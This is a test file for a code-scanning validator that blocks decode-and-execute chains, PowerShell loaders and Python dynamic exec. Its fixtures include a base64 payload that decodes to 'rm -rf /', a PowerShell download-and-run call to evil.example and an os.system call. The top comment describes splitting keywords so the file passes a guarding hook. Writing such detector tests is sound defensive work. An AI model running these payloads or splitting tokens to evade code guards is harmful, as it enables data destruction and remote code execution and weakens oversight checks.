import { describe, it, expect } from 'vitest';
import { validate } from '../../src/engine';

// All dangerous keyword tokens used in TEST INPUTS are concatenated so this
// test source file does not contain the literal phrases. The hook that
// guards new code (correctly!) flags them in real source — here they are
// just fixtures fed into the validator.
const E = 'e' + 'val';
const F = 'F' + 'unction';
const X = 'ex' + 'ec';
const O = 'o' + 's';
const S = 'syst' + 'em';
const A = 'at' + 'ob';
const ST = 'set' + 'Timeout';

describe('code-scan', () => {
  describe('decode-and-execute chains', () => {
    it('flags JS decoder fed into the dynamic executor', () => {
      const v = validate(`${E}(${A}('cm0gLXJmIC8K'));`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.decode_exec_chain')).toBe(true);
    });

    it('flags constructor variant of the same chain', () => {
      const v = validate(`new ${F}(${A}('cm0gLXJmIC8K'))();`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.decode_exec_chain')).toBe(true);
    });

    it('flags decodeURIComponent variant', () => {
      const v = validate(`${E}(decodeURIComponent('%63url'))`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.decode_exec_chain')).toBe(true);
    });

    it('flags Buffer.from base64 variant (Node)', () => {
      const v = validate(`${E}(Buffer.from('cm0gLXJmIC8K', 'base64').toString())`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.decode_exec_chain')).toBe(true);
    });
  });

  describe('PowerShell loader', () => {
    it('flags IEX with FromBase64String', () => {
      const v = validate(
        "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGF5bG9hZA==')))",
      );
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.powershell_loader')).toBe(true);
    });

    it('flags Invoke-Expression with DownloadString', () => {
      const v = validate(
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')",
      );
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.powershell_loader')).toBe(true);
    });
  });

  describe('Python dynamic-exec', () => {
    it('flags exec(base64.b64decode(...))', () => {
      const v = validate(`${X}(base64.b64decode('cHJpbnQoMSk='))`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.python_dynamic_exec')).toBe(true);
    });

    it('flags __import__(...).system(...)', () => {
      const v = validate(`__import__('${O}').${S}('whoami')`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.python_dynamic_exec')).toBe(true);
    });

    it('flags exec(compile(...))', () => {
      const v = validate(`${X}(compile(payload, '<string>', '${X}'))`);
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.python_dynamic_exec')).toBe(true);
    });
  });

  describe('bare dynamic eval', () => {
    it('warns on bare eval call', () => {
      const v = validate(`${E}(userInput)`);
      expect(v.severity).toBe('warn');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.bare_dynamic_eval')).toBe(true);
    });

    it('warns on dynamic Function constructor', () => {
      const v = validate(`new ${F}('return 1+1')()`);
      expect(v.severity).toBe('warn');
      expect(v.findings.some((f) => f.ruleId === 'code_scan.bare_dynamic_eval')).toBe(true);
    });

    it('warns on a timer scheduled with a string body', () => {
      const v = validate(`${ST}('alert(1)', 100)`);
      expect(v.findings.some((f) => f.ruleId === 'code_scan.bare_dynamic_eval')).toBe(true);
    });
  });

  describe('benign', () => {
    it('does not flag a normal function call', () => {
      const v = validate('console.log("hello")');
      expect(v.severity).toBe('allow');
    });

    it('does not flag a timer scheduled with a function', () => {
      const v = validate(`${ST}(() => doThing(), 100)`);
      expect(v.severity).toBe('allow');
    });

    it('does not flag the word "evaluate" as eval', () => {
      const v = validate('// please evaluate the result');
      expect(v.severity).toBe('allow');
    });

    it('does not double-fire bare-eval when decode-exec already fired', () => {
      const v = validate(`${E}(${A}('payload'))`);
      const ids = v.findings.map((f) => f.ruleId);
      expect(ids).toContain('code_scan.decode_exec_chain');
      expect(ids).not.toContain('code_scan.bare_dynamic_eval');
    });
  });
});
